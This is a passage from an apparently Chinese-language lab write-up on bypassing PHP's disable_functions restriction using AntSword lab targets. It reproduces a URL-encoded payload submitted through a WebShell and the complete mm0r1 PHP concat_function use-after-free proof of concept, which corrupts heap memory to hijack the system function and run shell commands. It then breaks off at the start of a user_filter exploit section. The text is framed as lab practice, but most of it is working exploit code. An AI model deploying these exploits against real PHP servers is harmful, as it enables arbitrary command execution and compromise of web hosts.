class="number">20</span>hex2bin(%<span class="number">24</span>system_address))%<span class="number">3</span>B%<span class="number">0</span>Awrite(<span class="number">0x10</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">20</span>hex2bin(dechex(s2n(%<span class="number">24</span>php_heap)%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x18%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x308%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x08)))%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">20</span>%<span class="number">22</span>Fake%<span class="number">20</span><span class="built_in">Closure</span>%<span class="number">20</span><span class="keyword">Object</span>%<span class="number">20</span>Address%<span class="number">3</span>A%<span class="number">20</span>%<span class="number">22</span>%<span class="number">20</span>.%<span class="number">20</span>bin2hex(%<span class="number">24</span>prefix%<span class="number">20</span>.%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">20</span>hex2bin(str_pad(dechex(s2n(%<span class="number">24</span>php_heap)%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x18%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x308%<span class="number">20</span>%<span class="number">2</span>B%<span class="number">200</span>x08)%<span class="number">2</span>C%<span class="number">208</span>%<span class="number">2</span>C%<span class="number">20</span>%<span class="number">220</span>%<span class="number">22</span>%<span class="number">2</span>C%<span class="number">0</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">20</span>STR_PAD_LEFT)))%<span class="number">20</span>.%<span class="number">20</span>%<span class="number">22</span>%<span class="number">5</span>Cn%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A(%<span class="number">24</span>helper%<span class="number">20</span>-%<span class="number">3</span>E%<span class="number">20</span>a)(%<span class="number">22</span>%<span class="number">2</span>Freadflag%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure>
<p>在WebShell中提交即可执行命令。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/WSma34RAVFZ1n5C.png" alt="image-20220110004152625"></p>
<p>在审计蚁剑disable_functions插件也可以很明显看出就是套用了官方的EXP</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/T8234QBREcCZhab.png" alt="image-20220110004445060"></p>
<h3 id="PHP-concat-function-UAF"><a href="#PHP-concat-function-UAF" class="headerlink" title="PHP concat_function UAF"></a>PHP concat_function UAF</h3><p><strong>漏洞简介</strong>：</p>
<p>此漏洞利用处理字符串连接的函数中的错误进行攻击。如果满足某些条件，诸如<code>$a.$b</code>之类的语句可能会导致内存损坏。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=81705">https://bugs.php.net/bug.php?id=81705</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本<ul>
<li>7.3 - all versions to date<ul>
<li>7.4 - all versions to date</li>
<li>8.0 - all versions to date</li>
<li>8.1 - all versions to date</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9</a></p>
<blockquote>
<p>虽然该靶场是蚁剑用来测试iconv漏洞的，但经过测试此靶场也可成功复现该漏洞。</p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>这里用到了国外大佬<em>mm0r1</em>写的EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.3-8.1 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=81705</span></span><br><span class="line"><span class="comment">#ok</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.3-8.1 versions</span></span><br><span class="line"><span class="comment"># released as of 2022-01-07</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Pwn(<span class="string">&quot;tac /flag&quot;</span>);			<span class="comment">// 可替换成需要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> LOGGING = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">const</span> CHUNK_DATA_SIZE = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> CHUNK_SIZE = ZEND_DEBUG_BUILD ? <span class="built_in">self</span>::CHUNK_DATA_SIZE + <span class="number">0x20</span> : <span class="built_in">self</span>::CHUNK_DATA_SIZE;</span><br><span class="line">    <span class="keyword">const</span> STRING_SIZE = <span class="built_in">self</span>::CHUNK_DATA_SIZE - <span class="number">0x18</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> HT_SIZE = <span class="number">0x118</span>;</span><br><span class="line">    <span class="keyword">const</span> HT_STRING_SIZE = <span class="built_in">self</span>::HT_SIZE - <span class="number">0x18</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$groom</span>[] = <span class="built_in">self</span>::alloc(<span class="built_in">self</span>::STRING_SIZE);</span><br><span class="line">            <span class="variable">$groom</span>[] = <span class="built_in">self</span>::alloc(<span class="built_in">self</span>::HT_STRING_SIZE);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$concat_str_addr</span> = <span class="built_in">self</span>::str2ptr(<span class="keyword">$this</span>-&gt;heap_leak(), <span class="number">16</span>);</span><br><span class="line">        <span class="variable">$fill</span> = <span class="built_in">self</span>::alloc(<span class="built_in">self</span>::STRING_SIZE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;abc = <span class="built_in">self</span>::alloc(<span class="built_in">self</span>::STRING_SIZE);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$concat_str_addr</span> + <span class="built_in">self</span>::CHUNK_SIZE;</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;abc @ 0x%x&quot;</span>, <span class="variable">$abc_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;free(<span class="variable">$abc_addr</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper = <span class="keyword">new</span> Helper;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;abc) &lt; <span class="number">0x1337</span>) &#123;</span><br><span class="line">            <span class="built_in">self</span>::log(<span class="string">&quot;uaf failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper-&gt;a = <span class="string">&quot;leet&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper-&gt;b = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;&#125;;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;helper-&gt;c = <span class="number">0xfeedface</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$helper_handlers</span> = <span class="keyword">$this</span>-&gt;rel_read(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="variable">$helper_handlers</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_addr</span> = <span class="keyword">$this</span>-&gt;rel_read(<span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;real closure @ 0x%x&quot;</span>, <span class="variable">$closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$closure_ce</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$closure_addr</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="variable">$closure_ce</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$basic_funcs</span> = <span class="keyword">$this</span>-&gt;get_basic_funcs(<span class="variable">$closure_ce</span>);</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="variable">$basic_funcs</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$zif_system</span> = <span class="keyword">$this</span>-&gt;get_system(<span class="variable">$basic_funcs</span>);</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_off</span> = <span class="number">0x70</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rel_write(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="keyword">$this</span>-&gt;read(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rel_write(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rel_write(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_closure_off</span> + <span class="number">0x18</span>;</span><br><span class="line">        <span class="built_in">self</span>::log(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;rel_write(<span class="number">0x20</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;helper-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;rel_write(<span class="number">0x20</span>, <span class="variable">$closure_addr</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;helper-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">heap_leak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$arr</span> = [[], []];</span><br><span class="line">        set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span> (<span class="params">&amp;<span class="variable">$arr</span>, &amp;<span class="variable">$buf</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$buf</span> = str_repeat(<span class="string">&quot;\x00&quot;</span>, <span class="built_in">self</span>::HT_STRING_SIZE);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">$arr</span>[<span class="number">1</span>] .= <span class="built_in">self</span>::alloc(<span class="built_in">self</span>::STRING_SIZE - strlen(<span class="string">&quot;Array&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$buf</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">free</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$payload</span> = pack(<span class="string">&quot;Q*&quot;</span>, <span class="number">0xdeadbeef</span>, <span class="number">0xcafebabe</span>, <span class="variable">$addr</span>);</span><br><span class="line">        <span class="variable">$payload</span> .= str_repeat(<span class="string">&quot;A&quot;</span>, <span class="built_in">self</span>::HT_STRING_SIZE - strlen(<span class="variable">$payload</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$arr</span> = [[], []];</span><br><span class="line">        set_error_handler(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="keyword">use</span> (<span class="params">&amp;<span class="variable">$arr</span>, &amp;<span class="variable">$buf</span>, &amp;<span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable">$buf</span> = str_repeat(<span class="variable">$payload</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable">$arr</span>[<span class="number">1</span>] .= <span class="string">&quot;x&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">rel_read</span>(<span class="params"><span class="variable">$offset</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::str2ptr(<span class="keyword">$this</span>-&gt;abc, <span class="variable">$offset</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">rel_write</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;abc[<span class="variable">$offset</span> + <span class="variable">$i</span>] = chr(<span class="variable">$value</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$value</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;rel_write(<span class="number">0x10</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$value</span> = strlen(<span class="keyword">$this</span>-&gt;helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span><br><span class="line">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span><br><span class="line">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span><br><span class="line">            <span class="comment">// $addr += 0x10;</span></span><br><span class="line">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span><br><span class="line">                in_array(<span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span><br><span class="line">                    [<span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>, <span class="number">20210902</span>])) &#123;</span><br><span class="line">                <span class="variable">$module_name_addr</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span><br><span class="line">                <span class="variable">$module_name</span> = <span class="keyword">$this</span>-&gt;read(<span class="variable">$module_name_addr</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span><br><span class="line">                    <span class="built_in">self</span>::log(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;read(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&quot;&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::LOGGING) &#123;</span><br><span class="line">            printf(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_shuffle(str_repeat(<span class="string">&quot;A&quot;</span>, <span class="variable">$size</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接访问即可执行命令。</p>
<h3 id="PHP-user-filter"><a href="#PHP-user-filter" class="headerlink" title="PHP user_filter"></a>PHP user_filter</h3><p><strong>漏洞简介</strong>：</p>
<p>这是一个十分严重的内存破坏漏洞，而且早在十年前就已经有人在官网上提交过此漏洞的相关细节。如今这个漏洞依然存在。</p>
<p>漏洞细节：<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=54350">https://bugs.php.net/bug.php?id=54350</a></p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP 版本<ul>
<li>5.* - exploitable with minor changes to the PoC<ul>
<li>7.0 - all versions to date</li>
<li>7.1 - all versions to date</li>
<li>7.2 - all versions to date</li>
<li>7.3 - all versions to date</li>
<li>7.4 &lt; 7.4.26</li>
<li>8.0 &lt; 8.0.13</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/7</a></p>
<blockquote>
<p>虽然该靶场是蚁剑用来测试GC UAF漏洞的，但经过测试此靶场也可成功复现该漏洞。</p>
</blockquote>
<p><strong>靶场突破</strong>：</p>
<p>这里用到了国外大佬<em>mm0r1</em>写的EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span 